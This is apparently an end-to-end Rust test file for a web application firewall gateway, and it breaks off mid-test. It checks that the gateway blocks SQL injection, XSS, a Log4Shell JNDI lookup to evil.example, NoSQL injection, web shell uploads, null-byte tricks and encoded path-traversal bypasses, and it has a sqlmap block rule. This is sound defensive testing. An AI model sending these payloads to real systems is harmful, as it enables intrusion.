//! End-to-end: real upstream app + gateway + HTTP client over TCP.

use std::convert::Infallible;
use std::io::Write;
use std::net::SocketAddr;
use std::sync::Arc;
use std::sync::atomic::{AtomicBool, Ordering};
use std::time::Duration;

use bytes::Bytes;
use http_body_util::{BodyExt, Full};
use hyper::server::conn::http1;
use hyper::service::service_fn;
use hyper::{Request, Response, StatusCode};
use hyper_util::client::legacy::Client;
use hyper_util::rt::{TokioExecutor, TokioIo};
use pattern_guard_gateway::config::GatewayConfig;
use pattern_guard_gateway::intel::{IntelAction, IntelEntry};
use pattern_guard_gateway::ipnet::Cidr;
use pattern_guard_gateway::state::State;
use sha2::{Digest, Sha256};
use tokio::net::TcpListener;

/// Upstream app: echoes method, path and the bot-score header it received.
async fn start_upstream() -> SocketAddr {
    let l = TcpListener::bind("127.0.0.1:0").await.unwrap();
    let addr = l.local_addr().unwrap();
    tokio::spawn(async move {
        loop {
            let (s, _) = l.accept().await.unwrap();
            tokio::spawn(async move {
                let svc = service_fn(|req: Request<hyper::body::Incoming>| async move {
                    let score = req
                        .headers()
                        .get("x-pattern-guard-bot-score")
                        .and_then(|v| v.to_str().ok())
                        .unwrap_or("none")
                        .to_string();
                    if req.uri().path().starts_with("/signin")
                        && !req.uri().query().unwrap_or("").contains("ok")
                    {
                        // a login endpoint that rejects the credentials
                        let mut r = Response::new(Full::new(Bytes::from("bad credentials")));
                        *r.status_mut() = StatusCode::UNAUTHORIZED;
                        return Ok::<_, Infallible>(r);
                    }
                    if req.uri().path().starts_with("/leak") {
                        // an app that leaks a database error, padded to `?pad=N` bytes
                        let pad: usize = req
                            .uri()
                            .query()
                            .and_then(|q| q.strip_prefix("pad="))
                            .and_then(|n| n.parse().ok())
                            .unwrap_or(0);
                        let body = format!(
                            "<html><body>You have an error in your SQL syntax; check the manual{}</body></html>",
                            "x".repeat(pad)
                        );
                        let mut r = Response::new(Full::new(Bytes::from(body)));
                        r.headers_mut()
                            .insert("content-type", "text/html".parse().unwrap());
                        return Ok::<_, Infallible>(r);
                    }
                    let body = format!("upstream {} {} bot_score={score}", req.method(), req.uri());
                    Ok::<_, Infallible>(Response::new(Full::new(Bytes::from(body))))
                });
                let _ = http1::Builder::new()
                    .serve_connection(TokioIo::new(s), svc)
                    .await;
            });
        }
    });
    addr
}

/// Mock CrowdSec LAPI: bans 192.0.2.70; records that the API key arrived.
async fn start_crowdsec(saw_key: Arc<AtomicBool>) -> SocketAddr {
    let l = TcpListener::bind("127.0.0.1:0").await.unwrap();
    let addr = l.local_addr().unwrap();
    tokio::spawn(async move {
        loop {
            let (s, _) = l.accept().await.unwrap();
            let saw = saw_key.clone();
            tokio::spawn(async move {
                let svc = service_fn(move |req: Request<hyper::body::Incoming>| {
                    let saw = saw.clone();
                    async move {
                        if req
                            .headers()
                            .get("x-api-key")
                            .map(|v| v == "test-key")
                            .unwrap_or(false)
                        {
                            saw.store(true, Ordering::SeqCst);
                        }
                        let startup = req.uri().query().unwrap_or("").contains("startup=true");
                        let body = if startup {
                            r#"{"new":[{"scope":"Ip","value":"192.0.2.70","type":"ban","origin":"CAPI","scenario":"crowdsecurity/http-probing","duration":"4h"}],"deleted":null}"#
                        } else {
                            r#"{"new":null,"deleted":null}"#
                        };
                        Ok::<_, Infallible>(Response::new(Full::new(Bytes::from(body))))
                    }
                });
                let _ = http1::Builder::new()
                    .serve_connection(TokioIo::new(s), svc)
                    .await;
            });
        }
    });
    addr
}

struct Gw {
    addr: SocketAddr,
    admin: SocketAddr,
    state: Arc<State>,
}

async fn start_gateway(extra: &str) -> Gw {
    let up = start_upstream().await;
    let toml = format!(
        "upstream = \"http://{up}\"\nmax_body_bytes = 100000\n{extra}\n[client_ip]\ntrusted_proxies = [\"127.0.0.1\"]\n[challenge]\ndifficulty = 8\n"
    );
    let cfg = GatewayConfig::from_toml_str(&toml).unwrap();
    let state = pattern_guard_gateway::build_state(cfg).unwrap();
    let l = TcpListener::bind("127.0.0.1:0").await.unwrap();
    let addr = l.local_addr().unwrap();
    let al = TcpListener::bind("127.0.0.1:0").await.unwrap();
    let admin = al.local_addr().unwrap();
    pattern_guard_gateway::start_background(&state, Some(al)).unwrap();
    tokio::spawn(pattern_guard_gateway::serve(state.clone(), l));
    Gw { addr, admin, state }
}

struct Resp {
    status: StatusCode,
    headers: hyper::HeaderMap,
    body: String,
}

async fn send(
    addr: SocketAddr,
    method: &str,
    path: &str,
    headers: &[(&str, &str)],
    body: &str,
) -> Resp {
    let client = Client::builder(TokioExecutor::new()).build_http::<Full<Bytes>>();
    let mut b = Request::builder()
        .method(method)
        .uri(format!("http://{addr}{path}"));
    for (k, v) in headers {
        b = b.header(*k, *v);
    }
    let resp = client
        .request(b.body(Full::new(Bytes::from(body.to_string()))).unwrap())
        .await
        .unwrap();
    let status = resp.status();
    let headers = resp.headers().clone();
    let body =
        String::from_utf8_lossy(&resp.into_body().collect().await.unwrap().to_bytes()).into_owned();
    Resp {
        status,
        headers,
        body,
    }
}

fn between<'a>(s: &'a str, start: &str, end: &str) -> &'a str {
    let i = s.find(start).unwrap() + start.len();
    let j = s[i..].find(end).unwrap() + i;
    &s[i..j]
}

#[tokio::test]
async fn proxies_clean_traffic_and_forwards_bot_score() {
    let gw = start_gateway("").await;
    let r = send(
        gw.addr,
        "GET",
        "/hello?name=O%27Brien",
        &[("user-agent", "Mozilla/5.0")],
        "",
    )
    .await;
    assert_eq!(r.status, StatusCode::OK);
    assert!(
        r.body.starts_with("upstream GET /hello?name=O%27Brien"),
        "{}",
        r.body
    );
    assert!(
        !r.body.contains("bot_score=none"),
        "bot score forwarded: {}",
        r.body
    );
}

#[tokio::test]
async fn waf_blocks_attacks_in_query_body_and_headers() {
    let gw = start_gateway("").await;
    let r = send(
        gw.addr,
        "GET",
        "/search?q=%27%20OR%20%271%27%3D%271",
        &[],
        "",
    )
    .await;
    assert_eq!(r.status, StatusCode::FORBIDDEN);
    assert!(r.body.contains("blocked"));
    let r = send(
        gw.addr,
        "POST",
        "/comment",
        &[("content-type", "application/x-www-form-urlencoded")],
        "text=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E",
    )
    .await;
    assert_eq!(r.status, StatusCode::FORBIDDEN);
    let r = send(
        gw.addr,
        "GET",
        "/",
        &[("x-api-version", "${jndi:ldap://evil.example/a}")],
        "",
    )
    .await;
    assert_eq!(r.status, StatusCode::FORBIDDEN);
    let r = send(
        gw.addr,
        "POST",
        "/api/login",
        &[("content-type", "application/json")],
        r#"{"user": "admin", "password": {"$ne": null}}"#,
    )
    .await;
    assert_eq!(r.status, StatusCode::FORBIDDEN);
    // a clean JSON body still passes
    let r = send(
        gw.addr,
        "POST",
        "/api/login",
        &[("content-type", "application/json")],
        r#"{"user":"ann","password":"it's me; really"}"#,
    )
    .await;
    assert_eq!(r.status, StatusCode::OK, "{}", r.body);
}

#[tokio::test]
async fn multipart_uploads_are_inspected_per_part() {
    let gw = start_gateway("[waf]\nexclude_params = [\"html\"]").await;
    let ct = [("content-type", "multipart/form-data; boundary=XyZ")];
    let upload = |name: &str, content: &str| {
        format!(
            "--XyZ\r\nContent-Disposition: form-data; name=\"title\"\r\n\r\nMy holiday\r\n\
             --XyZ\r\nContent-Disposition: form-data; name=\"file\"; filename=\"{name}\"\r\n\
             Content-Type: application/octet-stream\r\n\r\n{content}\r\n--XyZ--\r\n"
        )
    };
    let field = |name: &str| {
        format!(
            "--XyZ\r\nContent-Disposition: form-data; name=\"{name}\"\r\n\r\n\
             <script>alert(1)</script>\r\n--XyZ--\r\n"
        )
    };
    // clean requests first: blocked requests raise the client's behavioural risk
    let r = send(
        gw.addr,
        "POST",
        "/upload",
        &ct,
        &upload("beach.jpg", "GIF89a...."),
    )
    .await;
    assert_eq!(r.status, StatusCode::OK, "ordinary upload: {}", r.body);
    let r = send(gw.addr, "POST", "/save", &ct, &field("html")).await;
    assert_eq!(r.status, StatusCode::OK, "excluded field: {}", r.body);
    // a web shell upload is blocked by its file name, also when disguised
    let r = send(
        gw.addr,
        "POST",
        "/upload",
        &ct,
        &upload("shell.php", "hello"),
    )
    .await;
    assert_eq!(r.status, StatusCode::FORBIDDEN, "{}", r.body);
    let r = send(
        gw.addr,
        "POST",
        "/upload",
        &ct,
        &upload("photo. php", "hello"),
    )
    .await;
    assert_eq!(r.status, StatusCode::FORBIDDEN, "{}", r.body);
    // an attack in a multipart field is blocked
    let r = send(gw.addr, "POST", "/save", &ct, &field("comment")).await;
    assert_eq!(r.status, StatusCode::FORBIDDEN, "{}", r.body);
}

#[tokio::test]
async fn business_operations_and_logins_are_protected() {
    let gw = start_gateway(
        r#"
[[operations]]
name = "checkout"
path = "/checkout"
methods = ["POST"]
account = "header:authorization"
limit = { requests = 2, per_secs = 3600 }

[[operations]]
name = "payment callback"
path = "/payment/callback"
allowed_ips = ["203.0.113.0/24"]
unique = "json:transaction_id"

[[logins]]
name = "login"
path = "/signin"
account = "json:email"
max_failures = 3
action = "block"
"#,
    )
    .await;
    // per-account budget, whatever IP the account uses
    for ip in ["198.51.100.1", "198.51.100.2"] {
        let h = [("authorization", "Bearer alice"), ("x-forwarded-for", ip)];
        let r = send(gw.addr, "POST", "/checkout", &h, "").await;
        assert_eq!(r.status, StatusCode::OK, "{}", r.body);
    }
    let h = [
        ("authorization", "Bearer alice"),
        ("x-forwarded-for", "198.51.100.3"),
    ];
    let r = send(gw.addr, "POST", "/checkout", &h, "").await;
    assert_eq!(r.status, StatusCode::TOO_MANY_REQUESTS, "{}", r.body);
    assert!(r.headers.contains_key("retry-after"));
    // (from a fresh IP: the one just refused now looks risky to the behavioural ML)
    let h = [
        ("authorization", "Bearer bob"),
        ("x-forwarded-for", "198.51.100.4"),
    ];
    let r = send(gw.addr, "POST", "/checkout", &h, "").await;
    assert_eq!(r.status, StatusCode::OK, "other accounts unaffected");

    // payment callback: accepted once from the provider, replay refused, others refused
    let cb = r#"{"transaction_id": "TX-77", "status": "paid"}"#;
    let provider = [
        ("content-type", "application/json"),
        ("x-forwarded-for", "203.0.113.5"),
    ];
    let r = send(gw.addr, "POST", "/payment/callback", &provider, cb).await;
    assert_eq!(r.status, StatusCode::OK, "{}", r.body);
    let r = send(gw.addr, "POST", "/payment/callback", &provider, cb).await;
    assert_eq!(r.status, StatusCode::CONFLICT, "replay: {}", r.body);
    assert!(r.body.contains("replay"));
    let stranger = [
        ("content-type", "application/json"),
        ("x-forwarded-for", "192.0.2.99"),
    ];
    let r = send(
        gw.addr,
        "POST",
        "/payment/callback",
        &stranger,
        r#"{"transaction_id": "TX-78"}"#,
    )
    .await;
    assert_eq!(r.status, StatusCode::FORBIDDEN, "{}", r.body);

    // distributed brute force on one account: locked from any IP
    let login = r#"{"email": "alice@example.com", "password": "guess"}"#;
    for k in 1..=3 {
        let ip = format!("198.51.100.{}", 10 + k);
        let h = [
            ("content-type", "application/json"),
            ("x-forwarded-for", ip.as_str()),
        ];
        let r = send(gw.addr, "POST", "/signin", &h, login).await;
        assert_eq!(r.status, StatusCode::UNAUTHORIZED, "upstream answers");
    }
    let h = [
        ("content-type", "application/json"),
        ("x-forwarded-for", "198.51.100.99"),
    ];
    let r = send(gw.addr, "POST", "/signin", &h, login).await;
    assert_eq!(
        r.status,
        StatusCode::TOO_MANY_REQUESTS,
        "account locked: {}",
        r.body
    );
}

#[tokio::test]
async fn excluded_params_are_not_inspected() {
    let gw = start_gateway("[waf]\nexclude_params = [\"html\"]").await;
    let r = send(
        gw.addr,
        "GET",
        "/save?html=%3Cscript%3Ex()%3C/script%3E",
        &[],
        "",
    )
    .await;
    assert_eq!(r.status, StatusCode::OK);
}

#[tokio::test]
async fn deny_list_uses_client_ip_from_trusted_proxy() {
    let gw = start_gateway("[access]\ndeny = [\"192.0.2.0/28\"]").await;
    let r = send(gw.addr, "GET", "/", &[("x-forwarded-for", "192.0.2.5")], "").await;
    assert_eq!(r.status, StatusCode::FORBIDDEN);
    let r = send(
        gw.addr,
        "GET",
        "/",
        &[("x-forwarded-for", "198.51.100.5")],
        "",
    )
    .await;
    assert_eq!(r.status, StatusCode::OK);
}

#[tokio::test]
async fn proof_of_work_challenge_round_trip() {
    let gw = start_gateway("").await;
    gw.state.learned.intel.add(
        Cidr::parse("192.0.2.60").unwrap(),
        IntelEntry {
            action: IntelAction::Challenge,
            source: "test".into(),
            reason: "suspicious".into(),
            expires: None,
        },
    );
    let xff = ("x-forwarded-for", "192.0.2.60");
    let html = ("accept", "text/html");
    let page = send(gw.addr, "GET", "/shop?item=1", &[xff, html], "").await;
    assert_eq!(page.status, StatusCode::FORBIDDEN);
    assert!(page.body.contains("not a bot"));
    // API clients get JSON instead of a page
    let api = send(gw.addr, "GET", "/shop", &[xff], "").await;
    assert!(api.body.contains("challenge_required"));

    let vars = &page.body[page.body.find("var N=").unwrap()..];
    let nonce = between(vars, "var N=\"", "\"");
    let e = between(vars, ",E=", ",");
    let d: u32 = between(vars, ",D=", ",").parse().unwrap();
    let s = between(vars, ",S=\"", "\"");
    let counter = (0u64..)
        .find(|c| {
            let h = Sha256::digest(format!("{nonce}:{c}").as_bytes());
            pattern_guard_gateway::challenge::leading_zero_bits(&h) >= d
        })
        .unwrap();
    let verify = format!(
        "/.pattern-guard/verify?n={nonce}&e={e}&d={d}&s={s}&c={counter}&r=%2Fshop%3Fitem%3D1"
    );
    let v = send(gw.addr, "GET", &verify, &[xff], "").await;
    assert_eq!(v.status, StatusCode::FOUND);
    assert_eq!(v.headers.get("location").unwrap(), "/shop?item=1");
    let cookie = v
        .headers
        .get("set-cookie")
        .unwrap()
        .to_str()
        .unwrap()
        .split(';')
        .next()
        .unwrap()
        .to_string();

    let ok = send(
        gw.addr,
        "GET",
        "/shop?item=1",
        &[xff, html, ("cookie", &cookie)],
        "",
    )
    .await;
    assert_eq!(ok.status, StatusCode::OK, "{}", ok.body);
    // the cookie is bound to the IP it was issued for
    let other = send(
        gw.addr,
        "GET",
        "/shop",
        &[("x-forwarded-for", "192.0.2.61"), ("cookie", &cookie)],
        "",
    )
    .await;
    assert_eq!(
        other.status,
        StatusCode::OK,
        "other IP isn't flagged, so passes anyway"
    );
    gw.state.learned.intel.add(
        Cidr::parse("192.0.2.61").unwrap(),
        IntelEntry {
            action: IntelAction::Challenge,
            source: "test".into(),
            reason: "x".into(),
            expires: None,
        },
    );
    let other = send(
        gw.addr,
        "GET",
        "/shop",
        &[("x-forwarded-for", "192.0.2.61"), ("cookie", &cookie)],
        "",
    )
    .await;
    assert_eq!(
        other.status,
        StatusCode::FORBIDDEN,
        "stolen cookie doesn't work from another IP"
    );
    // forged solution is rejected
    let bad = send(
        gw.addr,
        "GET",
        &verify.replace(&format!("s={s}"), "s=00ff"),
        &[xff],
        "",
    )
    .await;
    assert_eq!(bad.status, StatusCode::FORBIDDEN);
}

#[tokio::test]
async fn crowdsec_decisions_are_enforced() {
    let saw_key = Arc::new(AtomicBool::new(false));
    let cs = start_crowdsec(saw_key.clone()).await;
    let gw = start_gateway(&format!(
        "[crowdsec]\nenabled = true\nurl = \"http://{cs}\"\napi_key = \"test-key\"\npoll_secs = 1"
    ))
    .await;
    for _ in 0..50 {
        if !gw.state.learned.intel.is_empty() {
            break;
        }
        tokio::time::sleep(Duration::from_millis(100)).await;
    }
    assert!(saw_key.load(Ordering::SeqCst), "bouncer sent X-Api-Key");
    let r = send(
        gw.addr,
        "GET",
        "/",
        &[("x-forwarded-for", "192.0.2.70")],
        "",
    )
    .await;
    assert_eq!(r.status, StatusCode::FORBIDDEN);
    let m = send(gw.admin, "GET", "/metrics", &[], "").await;
    assert!(
        m.body
            .contains("pattern_guard_blocked_total{layer=\"reputation\"} 1"),
        "{}",
        m.body
    );
    assert!(m.body.contains("pattern_guard_crowdsec_up 1"));
}

#[tokio::test]
async fn suricata_alerts_become_blocks() {
    let dir = std::env::temp_dir().join(format!("pg_gw_eve_{}", std::process::id()));
    std::fs::create_dir_all(&dir).unwrap();
    let eve = dir.join("eve.json");
    std::fs::write(&eve, "").unwrap();
    let gw = start_gateway(&format!(
        "[[feeds]]\nkind = \"suricata\"\npath = \"{}\"\nblock_secs = 60",
        eve.display()
    ))
    .await;
    tokio::time::sleep(Duration::from_millis(200)).await;
    let mut f = std::fs::OpenOptions::new().append(true).open(&eve).unwrap();
    writeln!(
        f,
        r#"{{"event_type":"alert","src_ip":"192.0.2.80","dest_ip":"10.0.0.1","alert":{{"signature":"ET EXPLOIT test","severity":1}}}}"#
    )
    .unwrap();
    drop(f);
    for _ in 0..40 {
        if gw
            .state
            .learned
            .intel
            .lookup("192.0.2.80".parse().unwrap())
            .is_some()
        {
            break;
        }
        tokio::time::sleep(Duration::from_millis(100)).await;
    }
    let r = send(
        gw.addr,
        "GET",
        "/",
        &[("x-forwarded-for", "192.0.2.80")],
        "",
    )
    .await;
    assert_eq!(r.status, StatusCode::FORBIDDEN);
}

#[tokio::test]
async fn detect_mode_logs_but_forwards() {
    let dir = std::env::temp_dir().join(format!("pg_gw_log_{}", std::process::id()));
    std::fs::create_dir_all(&dir).unwrap();
    let log = dir.join("decisions.jsonl");
    let gw = start_gateway(&format!(
        "mode = \"detect\"\n[log]\ndecisions = \"{}\"",
        log.display()
    ))
    .await;
    let r = send(
        gw.addr,
        "GET",
        "/search?q=%3Cscript%3Ealert(1)%3C/script%3E",
        &[],
        "",
    )
    .await;
    assert_eq!(r.status, StatusCode::OK, "detect mode never interferes");
    let m = send(gw.admin, "GET", "/metrics", &[], "").await;
    assert!(
        m.body.contains("pattern_guard_would_mitigate_total 1"),
        "{}",
        m.body
    );
    for _ in 0..20 {
        if std::fs::read_to_string(&log)
            .map(|s| s.contains("\"xss\""))
            .unwrap_or(false)
        {
            break;
        }
        tokio::time::sleep(Duration::from_millis(50)).await;
    }
    let line = std::fs::read_to_string(&log).unwrap();
    let v: serde_json::Value = serde_json::from_str(line.lines().next().unwrap()).unwrap();
    assert_eq!(v["event_type"], "alert");
    assert_eq!(v["pattern_guard"]["enforced"], false);
    assert_eq!(v["pattern_guard"]["waf"][0]["class"], "xss");
    assert!(v["srcip"].is_string());
}

#[tokio::test]
async fn body_limit_and_admin_endpoints() {
    let gw = start_gateway("").await;
    let big = "a".repeat(200_000);
    let r = send(
        gw.addr,
        "POST",
        "/upload",
        &[("content-type", "text/plain")],
        &big,
    )
    .await;
    assert_eq!(r.status, StatusCode::PAYLOAD_TOO_LARGE);
    send(gw.addr, "GET", "/api/items/42", &[], "").await;
    send(gw.addr, "GET", "/api/items/43", &[], "").await;
    let inv = send(gw.admin, "GET", "/inventory", &[], "").await;
    assert!(inv.body.contains("GET /api/items/{n}"), "{}", inv.body);
    let h = send(gw.admin, "GET", "/healthz", &[], "").await;
    assert_eq!(h.body, "ok");
}

#[tokio::test]
async fn custom_rules_gatekeep() {
    let gw = start_gateway(
        r#"
[[rules]]
name = "admin only from office"
path = "/admin"
not_ips = ["10.0.0.0/8"]
action = "block"
[[rules]]
name = "trusted scanner"
headers = [{ name = "x-scanner-token", regex = "^s3cret$" }]
action = "allow"
[[rules]]
name = "no sqlmap"
user_agent_regex = "(?i)sqlmap"
action = "block"
"#,
    )
    .await;
    let outsider = ("x-forwarded-for", "203.0.113.5");
    let office = ("x-forwarded-for", "10.1.1.1");
    assert_eq!(
        send(gw.addr, "GET", "/admin/users", &[outsider], "")
            .await
            .status,
        StatusCode::FORBIDDEN
    );
    assert_eq!(
        send(gw.addr, "GET", "/admin/users", &[office], "")
            .await
            .status,
        StatusCode::OK
    );
    // an allow rule bypasses every other layer, even an obvious payload
    let r = send(
        gw.addr,
        "GET",
        "/search?q=%27%20OR%20%271%27%3D%271",
        &[outsider, ("x-scanner-token", "s3cret")],
        "",
    )
    .await;
    assert_eq!(r.status, StatusCode::OK);
    let r = send(
        gw.addr,
        "GET",
        "/",
        &[outsider, ("user-agent", "sqlmap/1.8")],
        "",
    )
    .await;
    assert_eq!(r.status, StatusCode::FORBIDDEN);
    let m = send(gw.admin, "GET", "/metrics", &[], "").await;
    assert!(
        m.body
            .contains("pattern_guard_blocked_total{layer=\"rule\"} 2"),
        "{}",
        m.body
    );
}

#[tokio::test]
async fn rate_limits_answer_429_with_retry_after() {
    let gw = start_gateway(
        r#"
[[rate_limits]]
name = "login"
path = "/login"
methods = ["POST"]
requests = 3
per_secs = 60
"#,
    )
    .await;
    let ip = ("x-forwarded-for", "203.0.113.40");
    for _ in 0..3 {
        let r = send(gw.addr, "POST", "/login", &[ip], "user=a&pass=b").await;
        assert_eq!(r.status, StatusCode::OK);
    }
    let r = send(gw.addr, "POST", "/login", &[ip], "user=a&pass=b").await;
    assert_eq!(r.status, StatusCode::TOO_MANY_REQUESTS);
    assert_eq!(r.headers.get("retry-after").unwrap(), "20");
    assert!(r.body.contains("rate_limited"));
    // other IPs and other routes are unaffected
    let other = ("x-forwarded-for", "203.0.113.41");
    assert_eq!(
        send(gw.addr, "POST", "/login", &[other], "").await.status,
        StatusCode::OK
    );
    assert_eq!(
        send(gw.addr, "GET", "/shop", &[ip], "").await.status,
        StatusCode::OK
    );
}

#[tokio::test]
async fn repeat_offenders_and_trap_visitors_get_banned() {
    let gw = start_gateway(
        "[bans]\nthreshold = 3\nwindow_secs = 60\nban_secs = 300\n[traps]\npaths = [\"/wp-login.php\"]\n",
    )
    .await;
    // three WAF blocks → banned; then even a clean request is refused
    let attacker = ("x-forwarded-for", "203.0.113.50");
    for _ in 0..3 {
        let r = send(
            gw.addr,
            "GET",
            "/s?q=%3Cscript%3Ealert(1)%3C/script%3E",
            &[attacker],
            "",
        )
        .await;
        assert_eq!(r.status, StatusCode::FORBIDDEN);
    }
    assert_eq!(
        send(gw.addr, "GET", "/shop", &[attacker], "").await.status,
        StatusCode::FORBIDDEN
    );
    // one visit to a trap → banned at once
    let prober = ("x-forwarded-for", "203.0.113.51");
    assert_eq!(
        send(gw.addr, "GET", "/wp-login.php", &[prober], "")
            .await
            .status,
        StatusCode::FORBIDDEN
    );
    assert_eq!(
        send(gw.addr, "GET", "/shop", &[prober], "").await.status,
        StatusCode::FORBIDDEN
    );
    // admin: list and unban
    let list = send(gw.admin, "GET", "/bans", &[], "").await;
    assert!(
        list.body.contains("203.0.113.50") && list.body.contains("honeypot trap /wp-login.php"),
        "{}",
        list.body
    );
    let r = send(gw.admin, "POST", "/bans/unban?ip=203.0.113.51", &[], "").await;
    assert_eq!(r.status, StatusCode::OK);
    assert_eq!(
        send(gw.addr, "GET", "/shop", &[prober], "").await.status,
        StatusCode::OK
    );
    assert_eq!(
        send(gw.admin, "GET", "/bans/unban?ip=1.2.3.4", &[], "")
            .await
            .status,
        StatusCode::METHOD_NOT_ALLOWED
    );
}

#[tokio::test]
async fn protocol_enforcement_uses_the_right_status_codes() {
    let gw = start_gateway(
        "[protocol]\nmax_url_bytes = 200\nrestricted_extensions = [\".bak\", \".sql\"]\n",
    )
    .await;
    assert_eq!(
        send(gw.addr, "TRACE", "/", &[], "").await.status,
        StatusCode::METHOD_NOT_ALLOWED
    );
    let long = format!("/search?q={}", "a".repeat(300));
    assert_eq!(
        send(gw.addr, "GET", &long, &[], "").await.status,
        StatusCode::URI_TOO_LONG
    );
    assert_eq!(
        send(gw.addr, "GET", "/backup/site.bak", &[], "")
            .await
            .status,
        StatusCode::FORBIDDEN
    );
    let r = send(gw.addr, "GET", "/download?file=a.php%00.png", &[], "").await;
    assert_eq!(r.status, StatusCode::BAD_REQUEST);
    assert!(r.body.contains("NUL byte"), "{}", r.body);
    assert_eq!(
        send(gw.addr, "GET", "/fine", &[], "").await.status,
        StatusCode::OK
    );
    let m = send(gw.admin, "GET", "/metrics", &[], "").await;
    assert!(
        m.body
            .contains("pattern_guard_blocked_total{layer=\"protocol\"} 4"),
        "{}",
        m.body
    );
}

#[tokio::test]
async fn responses_get_security_headers() {
    let gw =
        start_gateway("[response_headers]\ncontent_security_policy = \"default-src 'self'\"\n")
            .await;
    let r = send(gw.addr, "GET", "/", &[], "").await;
    assert_eq!(r.status, StatusCode::OK);
    assert_eq!(r.headers["x-content-type-options"], "nosniff");
    assert_eq!(r.headers["x-frame-options"], "SAMEORIGIN");
    assert_eq!(r.headers["content-security-policy"], "default-src 'self'");
}

#[tokio::test]
async fn data_leaks_are_blocked_or_logged() {
    let gw = start_gateway("[response_inspection]\nenabled = true\nmax_bytes = 4096\n").await;
    let r = send(gw.addr, "GET", "/leak", &[("accept", "text/html")], "").await;
    assert_eq!(r.status, StatusCode::INTERNAL_SERVER_ERROR);
    assert!(
        !r.body.contains("SQL syntax"),
        "leak must not reach the client"
    );
    assert!(r.body.contains("Something went wrong"));
    // a long response: the start is inspected, the leak is still caught
    let r = send(gw.addr, "GET", "/leak?pad=50000", &[], "").await;
    assert_eq!(r.status, StatusCode::INTERNAL_SERVER_ERROR);
    // non-leaking responses pass through intact
    let r = send(gw.addr, "GET", "/fine", &[], "").await;
    assert!(r.body.starts_with("upstream GET /fine"));
    let m = send(gw.admin, "GET", "/metrics", &[], "").await;
    assert!(
        m.body
            .contains("pattern_guard_blocked_total{layer=\"data_leak\"} 2"),
        "{}",
        m.body
    );

    let logging = start_gateway(
        "[response_inspection]\nenabled = true\naction = \"log\"\nmax_bytes = 4096\n",
    )
    .await;
    let r = send(logging.addr, "GET", "/leak?pad=20000", &[], "").await;
    assert_eq!(
        r.status,
        StatusCode::OK,
        "log mode passes the response through"
    );
    assert_eq!(
        r.body.len(),
        "<html><body>You have an error in your SQL syntax; check the manual</body></html>".len()
            + 20000,
        "body intact across the inspection window"
    );
}

#[tokio::test]
async fn country_policy_and_country_rules() {
    let dir = std::env::temp_dir().join(format!("pg_gw_geo_{}", std::process::id()));
    std::fs::create_dir_all(&dir).unwrap();
    let csv = dir.join("countries.csv");
    std::fs::write(
        &csv,
        "1.0.0.0,1.0.0.255,AU\n5.0.0.0,5.255.255.255,DE\n203.0.113.0,203.0.113.255,XX\n",
    )
    .unwrap();
    let gw = start_gateway(&format!(
        "[geo]\ndatabase = \"{}\"\ndeny_countries = [\"XX\"]\nchallenge_countries = [\"DE\"]\n[[rules]]\nname = \"no admin from AU\"\npath = \"/admin\"\ncountries = [\"au\"]\naction = \"block\"\n",
        csv.display()
    ))
    .await;
    let xff = |ip: &'static str| ("x-forwarded-for", ip);
    assert_eq!(
        send(gw.addr, "GET", "/", &[xff("203.0.113.9")], "")
            .await
            .status,
        StatusCode::FORBIDDEN
    );
    let de = send(gw.addr, "GET", "/", &[xff("5.1.1.1")], "").await;
    assert!(de.body.contains("challenge_required"), "{}", de.body);
    assert_eq!(
        send(gw.addr, "GET", "/admin", &[xff("1.0.0.5")], "")
            .await
            .status,
        StatusCode::FORBIDDEN
    );
    assert_eq!(
        send(gw.addr, "GET", "/shop", &[xff("1.0.0.5")], "")
            .await
            .status,
        StatusCode::OK
    );
    assert_eq!(
        send(gw.addr, "GET", "/", &[xff("198.51.100.1")], "")
            .await
            .status,
        StatusCode::OK,
        "unknown country passes"
    );

    let cfg = GatewayConfig::from_toml_str(
        "upstream = \"http://127.0.0.1:1\"\n[geo]\ndeny_countries = [\"XX\"]\n",
    )
    .unwrap();
    let err = pattern_guard_gateway::build_state(cfg)
        .err()
        .expect("needs a database");
    assert!(err.contains("[geo] database"), "{err}");
}

/// Paths the application decodes (`%61dmin`, `%2E`, `..;`, `//`, upper case) can't walk
/// around protections, and can't move a request into an exemption (security review F1).
#[tokio::test]
async fn encoded_paths_cannot_walk_around_policies() {
    let gw = start_gateway(
        r#"
[waf]
exclude_paths = ["/health"]
[protocol]
restricted_extensions = [".sql"]
[traps]
paths = ["/wp-admin"]
ban_secs = 1
[[rules]]
name = "no admin"
path = "/admin"
action = "block"
[[rules]]
name = "public static files"
path = "/static/"
action = "allow"
"#,
    )
    .await;
    let xss = "x=%3Cscript%3Ealert(1)%3C%2Fscript%3E";
    for (n, path) in [
        "/%61dmin/secret",
        "/ADMIN/secret",
        "//admin/secret",
        "/x/../admin/secret",
        "/admin;x=1/secret",
    ]
    .iter()
    .enumerate()
    {
        let ip = format!("203.0.113.{}", 30 + n);
        let r = send(gw.addr, "GET", path, &[("x-forwarded-for", &ip)], "").await;
        assert_eq!(r.status, StatusCode::FORBIDDEN, "{path}: {}", r.body);
    }
    for path in ["/dump%2Esql", "/dump.SQL", "/dump.sql;v=1"] {
        let r = send(
            gw.addr,
            "GET",
            path,
            &[("x-forwarded-for", "203.0.113.40")],
            "",
        )
        .await;
        assert_eq!(r.status, StatusCode::FORBIDDEN, "{path}: {}", r.body);
    }
    // an exemption needs the raw and the canonical path: the WAF still sees these
    for path in ["/health/..;/app", "/health/%2e%2e/app", "/static/../app"] {
        let target = format!("{path}?{xss}");
        let r = send(
            gw.addr,
            "GET",
            &target,
            &[("x-forwarded-for", "203.0.113.41")],
            "",
        )
        .await;
        assert_eq!(r.status, StatusCode::FORBIDDEN, "{path}: {}", r.body);
    }
    // real exemptions still work
    let r = send(
        gw.addr,
        "GET",
        &format!("/health/live?{xss}"),
        &[("x-forwarded-for", "203.0.113.42")],
        "",
    )
    .await;
    assert_eq!(r.status, StatusCode::OK, "{}", r.body);
    // a trap hit through an encoded path still bans
    let r = send(
        gw.addr,
        "GET",
        "/%77p-admin/",
        &[("x-forwarded-for", "203.0.113.43")],
        "",
    )
    .await;
    assert_eq!(r.status, StatusCode::FORBIDDEN, "{}", r.body);
    assert!(
        r.body.contains("request_id") || r.body.contains("blocked"),
        "{}",
        r.body
    );
}

/// A browser form POST that meets a challenge can continue: same-origin forms are sent
/// again after the proof of work, cross-site ones never are (that would defeat CSRF
/// protection), and API clients keep the JSON answer.
#[tokio::test]
async fn challenged_form_posts_can_continue() {
    let gw = start_gateway(
        r#"
[[rules]]
name = "challenge logins"
path = "/signin"
methods = ["POST"]
